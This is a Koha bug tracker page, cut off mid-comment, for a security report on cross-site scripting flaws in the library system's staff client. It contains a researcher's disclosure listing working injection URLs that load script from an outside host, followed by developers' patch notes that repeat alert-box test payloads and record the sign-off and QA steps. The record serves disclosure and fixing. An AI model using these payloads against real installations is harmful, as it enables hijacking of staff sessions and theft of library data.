UTC](#attach_40437 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40437&action=edit) | [Diff](attachment.cgi?id=40437&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40437) | | [**Bug 14423 : XSS issues in marc\_subfields\_structure**](attachment.cgi?id=40438 "View the content of the attachment") (8.15 KB, patch)  [2015-06-21 08:49 UTC](#attach_40438 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40438&action=edit) | [Diff](attachment.cgi?id=40438&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40438) | | [**Bug 14423 : XSS bugs in catalogue search**](attachment.cgi?id=40439 "View the content of the attachment") (3.22 KB, patch)  [2015-06-21 09:11 UTC](#attach_40439 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40439&action=edit) | [Diff](attachment.cgi?id=40439&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40439) | | [**Bug 14423 : Multiple XSS vulnerabilities in serials-search**](attachment.cgi?id=40440 "View the content of the attachment") (6.55 KB, patch)  [2015-06-21 09:25 UTC](#attach_40440 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40440&action=edit) | [Diff](attachment.cgi?id=40440&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40440) | | [**Bug 14423 : Multiple XSS bugs in suggestion.pl**](attachment.cgi?id=40441 "View the content of the attachment") (5.70 KB, patch)  [2015-06-21 09:41 UTC](#attach_40441 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40441&action=edit) | [Diff](attachment.cgi?id=40441&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40441) | | [**Bug 14423 : XSS in authorities-home**](attachment.cgi?id=40449 "View the content of the attachment") (2.34 KB, patch)  [2015-06-22 09:46 UTC](#attach_40449 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40449&action=edit) | [Diff](attachment.cgi?id=40449&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40449) | | [**Bug 14423 : XSS bug in lateorders**](attachment.cgi?id=40450 "View the content of the attachment") (2.44 KB, patch)  [2015-06-22 09:47 UTC](#attach_40450 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40450&action=edit) | [Diff](attachment.cgi?id=40450&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40450) | | [**Bug 14423 XSS bug in auth\_subfields\_structure**](attachment.cgi?id=40451 "View the content of the attachment") (7.05 KB, patch)  [2015-06-22 09:47 UTC](#attach_40451 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40451&action=edit) | [Diff](attachment.cgi?id=40451&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40451) | | [**Bug 14423 : XSS issues in marc\_subfields\_structure**](attachment.cgi?id=40452 "View the content of the attachment") (8.22 KB, patch)  [2015-06-22 09:47 UTC](#attach_40452 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40452&action=edit) | [Diff](attachment.cgi?id=40452&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40452) | | [**Bug 14423 : XSS bugs in catalogue search**](attachment.cgi?id=40453 "View the content of the attachment") (3.29 KB, patch)  [2015-06-22 09:47 UTC](#attach_40453 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40453&action=edit) | [Diff](attachment.cgi?id=40453&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40453) | | [**Bug 14423 : Multiple XSS vulnerabilities in serials-search**](attachment.cgi?id=40454 "View the content of the attachment") (6.62 KB, patch)  [2015-06-22 09:47 UTC](#attach_40454 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40454&action=edit) | [Diff](attachment.cgi?id=40454&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40454) | | [**Bug 14423 : Multiple XSS bugs in suggestion.pl**](attachment.cgi?id=40455 "View the content of the attachment") (5.76 KB, patch)  [2015-06-22 09:47 UTC](#attach_40455 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40455&action=edit) | [Diff](attachment.cgi?id=40455&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40455) | | [**[PASSED QA] Bug 14423 : XSS in authorities-home**](attachment.cgi?id=40495 "View the content of the attachment") (2.41 KB, patch)  [2015-06-22 21:04 UTC](#attach_40495 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40495&action=edit) | [Diff](attachment.cgi?id=40495&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40495) | | [**[PASSED QA] Bug 14423 : XSS bug in lateorders**](attachment.cgi?id=40496 "View the content of the attachment") (2.51 KB, patch)  [2015-06-22 21:04 UTC](#attach_40496 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40496&action=edit) | [Diff](attachment.cgi?id=40496&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40496) | | [**[PASSED QA] Bug 14423 XSS bug in auth\_subfields\_structure**](attachment.cgi?id=40497 "View the content of the attachment") (7.12 KB, patch)  [2015-06-22 21:04 UTC](#attach_40497 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40497&action=edit) | [Diff](attachment.cgi?id=40497&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40497) | | [**[PASSED QA] Bug 14423 : XSS issues in marc\_subfields\_structure**](attachment.cgi?id=40498 "View the content of the attachment") (8.29 KB, patch)  [2015-06-22 21:04 UTC](#attach_40498 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40498&action=edit) | [Diff](attachment.cgi?id=40498&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40498) | | [**[PASSED QA] Bug 14423 : XSS bugs in catalogue search**](attachment.cgi?id=40499 "View the content of the attachment") (3.35 KB, patch)  [2015-06-22 21:04 UTC](#attach_40499 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40499&action=edit) | [Diff](attachment.cgi?id=40499&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40499) | | [**[PASSED QA] Bug 14423 : Multiple XSS vulnerabilities in serials-search**](attachment.cgi?id=40500 "View the content of the attachment") (6.69 KB, patch)  [2015-06-22 21:04 UTC](#attach_40500 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40500&action=edit) | [Diff](attachment.cgi?id=40500&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40500) | | [**[PASSED QA] Bug 14423 : Multiple XSS bugs in suggestion.pl**](attachment.cgi?id=40501 "View the content of the attachment") (5.83 KB, patch)  [2015-06-22 21:04 UTC](#attach_40501 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40501&action=edit) | [Diff](attachment.cgi?id=40501&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40501) | | [**Bug 14423 - tab characters in auth\_subfields\_structure**](attachment.cgi?id=40503 "View the content of the attachment") (2.62 KB, patch)  [2015-06-23 00:37 UTC](#attach_40503 "Go to the comment associated with the attachment"), Liz Rea | [Details](attachment.cgi?id=40503&action=edit) | [Diff](attachment.cgi?id=40503&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14423&attachment=40503) | | [Show Obsolete](#a0) (14) [View All](attachment.cgi?bugid=14423&action=viewall&hide_obsolete=1)  [Add an attachment](attachment.cgi?bugid=14423&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=14423&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=14423#c0)  Raschin Tavakoli    2015-06-19 14:35:43 UTC  ``` Created [attachment 40383](attachment.cgi?id=40383 "Screenshots") [[details]](attachment.cgi?id=40383&action=edit "Screenshots") Screenshots  Multiple XSS and XSRF issues were found during our tests in the Staff client of Koha Libray.   Here is a list of the findings, including working examples:  authorities-home.pl - parameter value: <http://testbox:9002/cgi-bin/koha/authorities/authorities-home.pl?op=do_search&type=intranet&marclist=mainentry&and_or=and&operator=contains&value>="/><script src="<http://cst.sba-research.org/x.js>"/>  lateorders.pl - parameter delay: <http://testbox:9002/cgi-bin/koha/acqui/lateorders.pl?delay>=<script src="<http://cst.sba-research.org/x.js>"></script>&estimateddeliverydatefrom=  auth_subfields_structure.pl - param authtypecode: <http://testbox:9002/cgi-bin/koha/admin/auth_subfields_structure.pl?op=add_form&authtypecode>='<script src="<http://cst.sba-research.org/x.js>"/>&tagfield=000  auth_subfields_structure.pl - param tagfield: <http://testbox:9002/cgi-bin/koha/admin/auth_subfields_structure.pl?frameworkcode=&op=add_form&tagfield>="/><script src="<http://cst.sba-research.org/x.js>"/>  marc_subfields_structure.pl - param tagfield: <http://testbox:9002/cgi-bin/koha/admin/marc_subfields_structure.pl?op=add_form&tagfield>="/><script src="<http://cst.sba-research.org/x.js>"></script>  search.pl - param limit: <http://testbox:9002/cgi-bin/koha/catalogue/search.pl?limit>=<script src="<http://cst.sba-research.org/x.js>"></script>  serials-search.pl - param bookseller_filter: testbox:9002/cgi-bin/koha/serials/serials-search.pl?bookseller_filter="""><script src="<http://cst.sba-research.org/x.js>"></script>&searched=1&title_filter=  serials-search.pl - param callnumber_filter: <http://testbox:9002/cgi-bin/koha/serials/serials-search.pl?callnumber_filter>="""><script src="<http://cst.sba-research.org/x.js>"></script>&searched=1  serials-search.pl - param EAN_filter: <http://testbox:9002/cgi-bin/koha/serials/serials-search.pl?EAN_filter>="""><script src="<http://cst.sba-research.org/x.js>"></script>&searched=1  serials-search.pl - param ISSN_filter: <http://testbox:9002/cgi-bin/koha/serials/serials-search.pl?ISSN_filter>="""><<script src="<http://cst.sba-research.org/x.js>"></script>&searched=1  serials-search.pl - param publisher_filter: <http://testbox:9002/cgi-bin/koha/serials/serials-search.pl?publisher_filter>="""><script src="<http://cst.sba-research.org/x.js>"></script>&searched=1  serials-search.pl - param title_filter: <http://testbox:9002/cgi-bin/koha/serials/serials-search.pl?title_filter>="""><script src="<http://cst.sba-research.org/x.js>"></script>&searched=1  suggestion.pl - param author: <http://testbox:9002/cgi-bin/koha/suggestion/suggestion.pl?author>="><script src="<http://cst.sba-research.org/x.js>"></script>&accepteddate_to=  suggestion.pl - param collectiontitle: <http://testbox:9002/cgi-bin/koha/suggestion/suggestion.pl?collectiontitle>="><script src="<http://cst.sba-research.org/x.js>"></script>&accepteddate_to=  suggestion.pl - param copyrightdate: <http://testbox:9002/cgi-bin/koha/suggestion/suggestion.pl?copyrightdate>="><script src="<http://cst.sba-research.org/x.js>"></script>&accepteddate_to=  suggestion.pl - param isbn: <http://testbox:9002/cgi-bin/koha/suggestion/suggestion.pl?isbn>="><script src="<http://cst.sba-research.org/x.js>"></script>&accepteddate_to=  suggestion.pl - param manageddate_from: <http://testbox:9002/cgi-bin/koha/suggestion/suggestion.pl?manageddate_from>="><script src="<http://cst.sba-research.org/x.js>"></script>&accepteddate_to=  suggestion.pl - param manageddate_to: <http://testbox:9002/cgi-bin/koha/suggestion/suggestion.pl?manageddate_to>="><script src="<http://cst.sba-research.org/x.js>"></script>&accepteddate_to=  suggestion.pl - param publishercode: <http://testbox:9002/cgi-bin/koha/suggestion/suggestion.pl?publishercode>="><script src="<http://cst.sba-research.org/x.js>"></script>&accepteddate_to=  suggestion.pl - param suggesteddate_from: <http://testbox:9002/cgi-bin/koha/suggestion/suggestion.pl?suggesteddate_from>="><script src="<http://cst.sba-research.org/x.js>"></script>&accepteddate_to=  suggestion.pl - param suggesteddate_to: <http://testbox:9002/cgi-bin/koha/suggestion/suggestion.pl?suggesteddate_to>="><script src="<http://cst.sba-research.org/x.js>"></script>&accepteddate_to=  ---  Vulnerability Disclosure by Combinatorial Security Testing Group of SBA Research. Contact: cst@sba-research.org ```   [Comment 1](show_bug.cgi?id=14423#c1)  Chris Cormack    2015-06-21 08:12:43 UTC  Comment hidden (obsolete)  ``` Created [attachment 40435](attachment.cgi?id=40435&action=diff "Bug 14423 : XSS in authorities-home") [[details]](attachment.cgi?id=40435&action=edit "Bug 14423 : XSS in authorities-home") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40435) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS in authorities-home  To test: 1/ Hit a url like <http://localhost:8081/cgi-bin/koha/authorities/authorities-home.pl?op=do_search&type=intranet&marclist=mainentry&and_or=and&operator=contains&value=%22/%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice you get 3 alert boxes 3/ Apply patch 4/ Hit the url again, no js ```   [Comment 2](show_bug.cgi?id=14423#c2)  Chris Cormack    2015-06-21 08:20:43 UTC  Comment hidden (obsolete)  ``` Created [attachment 40436](attachment.cgi?id=40436&action=diff "Bug 14423 : XSS bug in lateorders") [[details]](attachment.cgi?id=40436&action=edit "Bug 14423 : XSS bug in lateorders") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40436) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS bug in lateorders  1/ hit a url like <http://localhost:8081/cgi-bin/koha/acqui/lateorders.pl?delay>=<script>alert('oh noes')</script>&estimateddeliverydatefrom 2/ Not you get an alert box 3/ Apply patch notice it is fixed 4/ Test functionality still works ```   [Comment 3](show_bug.cgi?id=14423#c3)  Chris Cormack    2015-06-21 08:36:42 UTC  Comment hidden (obsolete)  ``` Created [attachment 40437](attachment.cgi?id=40437&action=diff "Bug 14423 XSS bug in auth_subfields_structure") [[details]](attachment.cgi?id=40437&action=edit "Bug 14423 XSS bug in auth_subfields_structure") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40437) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") XSS bug in auth_subfields_structure  1/ Hit a url like <http://localhost:8081/cgi-bin/koha/admin/auth_subfields_structure.pl?op=add_form&authtypecode=%27%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E&tagfield=%22/%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice a ton of alert boxes pop up 3/ Apply patch 4/ Reload url, no longer get any alerts 5/ Test fuctionality still works ```   [Comment 4](show_bug.cgi?id=14423#c4)  Chris Cormack    2015-06-21 08:49:32 UTC  Comment hidden (obsolete)  ``` Created [attachment 40438](attachment.cgi?id=40438&action=diff "Bug 14423 : XSS issues in marc_subfields_structure") [[details]](attachment.cgi?id=40438&action=edit "Bug 14423 : XSS issues in marc_subfields_structure") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40438) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS issues in marc_subfields_structure  1/ Hit a url like <http://localhost:8081/cgi-bin/koha/admin/marc_subfields_structure.pl?op=add_form&tagfield=%22/%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice all the alert boxes 3/ Apply patch 4/ Reload page, no more alerts 5/ Test functionality still works ```   [Comment 5](show_bug.cgi?id=14423#c5)  Chris Cormack    2015-06-21 09:11:12 UTC  Comment hidden (obsolete)  ``` Created [attachment 40439](attachment.cgi?id=40439&action=diff "Bug 14423 : XSS bugs in catalogue search") [[details]](attachment.cgi?id=40439&action=edit "Bug 14423 : XSS bugs in catalogue search") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40439) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS bugs in catalogue search  To test  1/ hit a url like <http://localhost:8081/cgi-bin/koha/catalogue/search.pl?limit=%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice alert boxes 3/ Apply patch 4/ Reload url, no alerts 5/ Check search still works ```   [Comment 6](show_bug.cgi?id=14423#c6)  Chris Cormack    2015-06-21 09:25:58 UTC  Comment hidden (obsolete)  ``` Created [attachment 40440](attachment.cgi?id=40440&action=diff "Bug 14423 : Multiple XSS vulnerabilities in serials-search") [[details]](attachment.cgi?id=40440&action=edit "Bug 14423 : Multiple XSS vulnerabilities in serials-search") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40440) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : Multiple XSS vulnerabilities in serials-search  To test  1/ Hit a url like <http://localhost:8081/cgi-bin/koha/serials/serials-search.pl?bookseller_filter=%22%22%22%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E&searched=1&title_filter>= 2/ Notice alert boxes 3/ Apply patch 4/ Reload, notice fixed  Repeat for callnumber_filter EAN_filter ISSN_filter publisher_filter title_filter ```   [Comment 7](show_bug.cgi?id=14423#c7)  Chris Cormack    2015-06-21 09:41:32 UTC  Comment hidden (obsolete)  ``` Created [attachment 40441](attachment.cgi?id=40441&action=diff "Bug 14423 : Multiple XSS bugs in suggestion.pl") [[details]](attachment.cgi?id=40441&action=edit "Bug 14423 : Multiple XSS bugs in suggestion.pl") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40441) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : Multiple XSS bugs in suggestion.pl  To test 1/ Hit a url like <http://localhost:8081/cgi-bin/koha/suggestion/suggestion.pl?author=%22%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E&accepteddate_to>= 2/ Notice alert box(es) 3/ Apply patch 4/ Reload and notice alert is gone  Repeat for collection_title copyrightdate isbn manageddate_from manageddate_to publishercode suggesteddate_from suggesteddate_to ```   [Comment 8](show_bug.cgi?id=14423#c8)  Jonathan Druart    2015-06-22 09:46:55 UTC  Comment hidden (obsolete)  ``` Created [attachment 40449](attachment.cgi?id=40449&action=diff "Bug 14423 : XSS in authorities-home") [[details]](attachment.cgi?id=40449&action=edit "Bug 14423 : XSS in authorities-home") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40449) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS in authorities-home  To test: 1/ Hit a url like <http://localhost:8081/cgi-bin/koha/authorities/authorities-home.pl?op=do_search&type=intranet&marclist=mainentry&and_or=and&operator=contains&value=%22/%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice you get 3 alert boxes 3/ Apply patch 4/ Hit the url again, no js  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 9](show_bug.cgi?id=14423#c9)  Jonathan Druart    2015-06-22 09:47:01 UTC  Comment hidden (obsolete)  ``` Created [attachment 40450](attachment.cgi?id=40450&action=diff "Bug 14423 : XSS bug in lateorders") [[details]](attachment.cgi?id=40450&action=edit "Bug 14423 : XSS bug in lateorders") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40450) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS bug in lateorders  1/ hit a url like <http://localhost:8081/cgi-bin/koha/acqui/lateorders.pl?delay>=<script>alert('oh noes')</script>&estimateddeliverydatefrom 2/ Not you get an alert box 3/ Apply patch notice it is fixed 4/ Test functionality still works  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 10](show_bug.cgi?id=14423#c10)  Jonathan Druart    2015-06-22 09:47:08 UTC  Comment hidden (obsolete)  ``` Created [attachment 40451](attachment.cgi?id=40451&action=diff "Bug 14423 XSS bug in auth_subfields_structure") [[details]](attachment.cgi?id=40451&action=edit "Bug 14423 XSS bug in auth_subfields_structure") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40451) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") XSS bug in auth_subfields_structure  1/ Hit a url like <http://localhost:8081/cgi-bin/koha/admin/auth_subfields_structure.pl?op=add_form&authtypecode=%27%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E&tagfield=%22/%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice a ton of alert boxes pop up 3/ Apply patch 4/ Reload url, no longer get any alerts 5/ Test fuctionality still works  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 11](show_bug.cgi?id=14423#c11)  Jonathan Druart    2015-06-22 09:47:11 UTC  Comment hidden (obsolete)  ``` Created [attachment 40452](attachment.cgi?id=40452&action=diff "Bug 14423 : XSS issues in marc_subfields_structure") [[details]](attachment.cgi?id=40452&action=edit "Bug 14423 : XSS issues in marc_subfields_structure") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40452) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS issues in marc_subfields_structure  1/ Hit a url like <http://localhost:8081/cgi-bin/koha/admin/marc_subfields_structure.pl?op=add_form&tagfield=%22/%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice all the alert boxes 3/ Apply patch 4/ Reload page, no more alerts 5/ Test functionality still works  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 12](show_bug.cgi?id=14423#c12)  Jonathan Druart    2015-06-22 09:47:14 UTC  Comment hidden (obsolete)  ``` Created [attachment 40453](attachment.cgi?id=40453&action=diff "Bug 14423 : XSS bugs in catalogue search") [[details]](attachment.cgi?id=40453&action=edit "Bug 14423 : XSS bugs in catalogue search") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40453) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS bugs in catalogue search  To test  1/ hit a url like <http://localhost:8081/cgi-bin/koha/catalogue/search.pl?limit=%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice alert boxes 3/ Apply patch 4/ Reload url, no alerts 5/ Check search still works  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 13](show_bug.cgi?id=14423#c13)  Jonathan Druart    2015-06-22 09:47:18 UTC  Comment hidden (obsolete)  ``` Created [attachment 40454](attachment.cgi?id=40454&action=diff "Bug 14423 : Multiple XSS vulnerabilities in serials-search") [[details]](attachment.cgi?id=40454&action=edit "Bug 14423 : Multiple XSS vulnerabilities in serials-search") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40454) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : Multiple XSS vulnerabilities in serials-search  To test  1/ Hit a url like <http://localhost:8081/cgi-bin/koha/serials/serials-search.pl?bookseller_filter=%22%22%22%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E&searched=1&title_filter>= 2/ Notice alert boxes 3/ Apply patch 4/ Reload, notice fixed  Repeat for callnumber_filter EAN_filter ISSN_filter publisher_filter title_filter  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 14](show_bug.cgi?id=14423#c14)  Jonathan Druart    2015-06-22 09:47:21 UTC  Comment hidden (obsolete)  ``` Created [attachment 40455](attachment.cgi?id=40455&action=diff "Bug 14423 : Multiple XSS bugs in suggestion.pl") [[details]](attachment.cgi?id=40455&action=edit "Bug 14423 : Multiple XSS bugs in suggestion.pl") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40455) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : Multiple XSS bugs in suggestion.pl  To test 1/ Hit a url like <http://localhost:8081/cgi-bin/koha/suggestion/suggestion.pl?author=%22%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E&accepteddate_to>= 2/ Notice alert box(es) 3/ Apply patch 4/ Reload and notice alert is gone  Repeat for collection_title copyrightdate isbn manageddate_from manageddate_to publishercode suggesteddate_from suggesteddate_to  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```  [Comment 16](show_bug.cgi?id=14423#c16)  Katrin Fischer    2015-06-22 21:04:24 UTC  ``` Created [attachment 40495](attachment.cgi?id=40495&action=diff "[PASSED QA] Bug 14423 : XSS in authorities-home") [[details]](attachment.cgi?id=40495&action=edit "[PASSED QA] Bug 14423 : XSS in authorities-home") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40495) [PASSED QA] [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS in authorities-home  To test: 1/ Hit a url like <http://localhost:8081/cgi-bin/koha/authorities/authorities-home.pl?op=do_search&type=intranet&marclist=mainentry&and_or=and&operator=contains&value=%22/%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice you get 3 alert boxes 3/ Apply patch 4/ Hit the url again, no js  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org>  Signed-off-by: Katrin Fischer <katrin.fischer.83@web.de> ```  [Comment 17](show_bug.cgi?id=14423#c17)  Katrin Fischer    2015-06-22 21:04:27 UTC  ``` Created [attachment 40496](attachment.cgi?id=40496&action=diff "[PASSED QA] Bug 14423 : XSS bug in lateorders") [[details]](attachment.cgi?id=40496&action=edit "[PASSED QA] Bug 14423 : XSS bug in lateorders") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40496) [PASSED QA] [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS bug in lateorders  1/ hit a url like <http://localhost:8081/cgi-bin/koha/acqui/lateorders.pl?delay>=<script>alert('oh noes')</script>&estimateddeliverydatefrom 2/ Not you get an alert box 3/ Apply patch notice it is fixed 4/ Test functionality still works  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org>  Signed-off-by: Katrin Fischer <katrin.fischer.83@web.de> ```  [Comment 18](show_bug.cgi?id=14423#c18)  Katrin Fischer    2015-06-22 21:04:30 UTC  ``` Created [attachment 40497](attachment.cgi?id=40497&action=diff "[PASSED QA] Bug 14423 XSS bug in auth_subfields_structure") [[details]](attachment.cgi?id=40497&action=edit "[PASSED QA] Bug 14423 XSS bug in auth_subfields_structure") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40497) [PASSED QA] [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") XSS bug in auth_subfields_structure  1/ Hit a url like <http://localhost:8081/cgi-bin/koha/admin/auth_subfields_structure.pl?op=add_form&authtypecode=%27%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E&tagfield=%22/%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice a ton of alert boxes pop up 3/ Apply patch 4/ Reload url, no longer get any alerts 5/ Test fuctionality still works  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org>  Signed-off-by: Katrin Fischer <katrin.fischer.83@web.de> ```  [Comment 19](show_bug.cgi?id=14423#c19)  Katrin Fischer    2015-06-22 21:04:33 UTC  ``` Created [attachment 40498](attachment.cgi?id=40498&action=diff "[PASSED QA] Bug 14423 : XSS issues in marc_subfields_structure") [[details]](attachment.cgi?id=40498&action=edit "[PASSED QA] Bug 14423 : XSS issues in marc_subfields_structure") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40498) [PASSED QA] [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS issues in marc_subfields_structure  1/ Hit a url like <http://localhost:8081/cgi-bin/koha/admin/marc_subfields_structure.pl?op=add_form&tagfield=%22/%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice all the alert boxes 3/ Apply patch 4/ Reload page, no more alerts 5/ Test functionality still works  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org>  Signed-off-by: Katrin Fischer <katrin.fischer.83@web.de> ```  [Comment 20](show_bug.cgi?id=14423#c20)  Katrin Fischer    2015-06-22 21:04:36 UTC  ``` Created [attachment 40499](attachment.cgi?id=40499&action=diff "[PASSED QA] Bug 14423 : XSS bugs in catalogue search") [[details]](attachment.cgi?id=40499&action=edit "[PASSED QA] Bug 14423 : 